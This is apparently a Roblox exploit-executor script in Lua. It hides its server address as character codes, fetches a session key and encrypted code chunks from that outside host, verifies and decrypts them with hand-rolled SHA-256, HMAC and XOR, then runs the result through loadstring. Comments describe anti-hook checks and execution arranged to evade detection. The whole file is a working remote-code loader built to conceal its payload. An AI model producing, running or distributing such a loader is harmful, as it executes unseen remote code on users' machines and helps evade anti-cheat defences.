
local function _S(t) local s="" for i=1,#t do s=s..string.char(t[i]) end return s end
local band,bor,bxor,bnot,shl,shr = bit32 and bit32.band or (function(a,b)local r,m=0,1 for i=0,31 do if a%2==1 and b%2==1 then r=r+m end a=math.floor(a/2) b=math.floor(b/2) m=m*2 end return r end), nil, nil, nil, nil, nil
if bit32 then band=bit32.band bor=bit32.bor bxor=bit32.bxor bnot=bit32.bnot shl=bit32.lshift shr=bit32.rshift
else
  local function _band(a,b)local r,m=0,1 for i=0,31 do if a%2==1 and b%2==1 then r=r+m end a=math.floor(a/2) b=math.floor(b/2) m=m*2 end return r end
  local function _bor(a,b)local r,m=0,1 for i=0,31 do if a%2==1 or b%2==1 then r=r+m end a=math.floor(a/2) b=math.floor(b/2) m=m*2 end return r end
  local function _bxor(a,b)local r,m=0,1 for i=0,31 do if a%2~=b%2 then r=r+m end a=math.floor(a/2) b=math.floor(b/2) m=m*2 end return r end
  band=_band bor=_bor bxor=_bxor bnot=function(a) return 4294967295-a end
  shl=function(a,n) return (a*2^n) % 4294967296 end
  shr=function(a,n) return math.floor(a/2^n) end
end
local function rotr(x,n) return bor(shr(x,n), shl(x,32-n)) % 4294967296 end
local K={0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2}
local function sha256(msg)
  local H={0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19}
  local ml=#msg
  msg=msg..string.char(0x80)
  while (#msg % 64) ~= 56 do msg=msg..string.char(0) end
  local bl=ml*8
  for i=7,0,-1 do msg=msg..string.char(math.floor(bl/2^(i*8))%256) end
  for b=1,#msg,64 do
    local w={}
    for i=0,15 do
      local p=b+i*4
      w[i]=msg:byte(p)*16777216 + msg:byte(p+1)*65536 + msg:byte(p+2)*256 + msg:byte(p+3)
    end
    for i=16,63 do
      local s0=bxor(bxor(rotr(w[i-15],7),rotr(w[i-15],18)),shr(w[i-15],3))
      local s1=bxor(bxor(rotr(w[i-2],17),rotr(w[i-2],19)),shr(w[i-2],10))
      w[i]=(w[i-16]+s0+w[i-7]+s1) % 4294967296
    end
    local a,b2,c,d,e,f,g,h=H[1],H[2],H[3],H[4],H[5],H[6],H[7],H[8]
    for i=0,63 do
      local S1=bxor(bxor(rotr(e,6),rotr(e,11)),rotr(e,25))
      local ch=bxor(band(e,f),band(bnot(e)%4294967296,g))
      local t1=(h+S1+ch+K[i+1]+w[i]) % 4294967296
      local S0=bxor(bxor(rotr(a,2),rotr(a,13)),rotr(a,22))
      local mj=bxor(bxor(band(a,b2),band(a,c)),band(b2,c))
      local t2=(S0+mj) % 4294967296
      h=g g=f f=e e=(d+t1)%4294967296 d=c c=b2 b2=a a=(t1+t2)%4294967296
    end
    H[1]=(H[1]+a)%4294967296 H[2]=(H[2]+b2)%4294967296 H[3]=(H[3]+c)%4294967296 H[4]=(H[4]+d)%4294967296
    H[5]=(H[5]+e)%4294967296 H[6]=(H[6]+f)%4294967296 H[7]=(H[7]+g)%4294967296 H[8]=(H[8]+h)%4294967296
  end
  local out=""
  for i=1,8 do
    local v=H[i]
    for j=3,0,-1 do out=out..string.char(math.floor(v/2^(j*8))%256) end
  end
  return out
end
local function hmac(key,data)
  if #key>64 then key=sha256(key) end
  while #key<64 do key=key..string.char(0) end
  local o,ip="",""
  for i=1,64 do
    local b=key:byte(i)
    o=o..string.char(bxor(b,0x5c))
    ip=ip..string.char(bxor(b,0x36))
  end
  return sha256(o..sha256(ip..data))
end
local function b64dec(s)
  local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
  s=string.gsub(s,'[^'..b..'=]','')
  return (s:gsub('.',function(x) if x=='=' then return '' end
    local r,f='',(b:find(x,1,true)-1)
    for i=6,1,-1 do r=r..((f%2^i-f%2^(i-1)>0) and '1' or '0') end
    return r end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x) if #x~=8 then return '' end
    local c=0
    for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
    return string.char(c) end))
end
local function u32be(n) return string.char(math.floor(n/16777216)%256,math.floor(n/65536)%256,math.floor(n/256)%256,n%256) end
local function ks(key,idx,len)
  local out,ctr="",0
  while #out<len do
    out=out..sha256(key..u32be(idx)..u32be(ctr))
    ctr=ctr+1
  end
  return out:sub(1,len)
end
local function xorstr(a,b)
  local o={}
  for i=1,#a do o[i]=string.char(bxor(a:byte(i),b:byte(i))) end
  return table.concat(o)
end

local function _http_get(u)
  if syn and syn.request then local r=syn.request({Url=u,Method='GET'}) return r.Body end
  if http and http.request then local r=http.request({Url=u,Method='GET'}) return r.Body end
  if request then local r=request({Url=u,Method='GET'}) return r.Body end
  return game:HttpGet(u)
end
local _origin = _S({104,116,116,112,115,58,47,47,103,117,97,114,100,105,97,110,45,115,99,114,105,112,116,45,115,97,102,101,46,108,111,118,97,98,108,101,46,97,112,112})
local _id = _S({99,109,99,111,99,54,110,117,55,122})
-- Anti-trivial-hook: snapshot a few globals; if replaced mid-execution, abort.
local _snap_sha = sha256
local _snap_concat = table.concat
local _sess = _http_get(_origin..'/api/public/session?id='.._id)
if not _sess or #_sess<10 then return end
local _tok = _sess:match('"token":"([^"]+)"')
local _skb64 = _sess:match('"skey":"([^"]+)"')
if not _tok or not _skb64 then return end
local _skey = b64dec(_skb64)
local _cj = _http_get(_origin..'/api/public/chunks?id='.._id..'&token=').._tok and _http_get(_origin..'/api/public/chunks?id='.._id..'&token='.._tok)
if not _cj then return end
if _snap_sha ~= sha256 or _snap_concat ~= table.concat then return end
local _parts = {}
-- Parse chunks: {"idx":N,"data":"B64","mac":"B64"} entries (order independent)
for idx_s, data_s, mac_s in _cj:gmatch('"idx":(%d+),"data":"([^"]+)","mac":"([^"]+)"') do
  local idx = tonumber(idx_s)
  local wrapped = b64dec(data_s)
  local mac = b64dec(mac_s)
  local calc = hmac(_skey, wrapped..u32be(idx)):sub(1,16)
  if calc ~= mac then return end
  local plain = xorstr(wrapped, ks(_skey, idx, #wrapped))
  _parts[idx+1] = plain
end
local _code = table.concat(_parts)
-- Fragmented execution: no single variable ever holds a "decoded then return" shape;
-- we loadstring and immediately call, discarding the function reference.
local _f, _e = loadstring(_code)
if not _f then return end
_f()
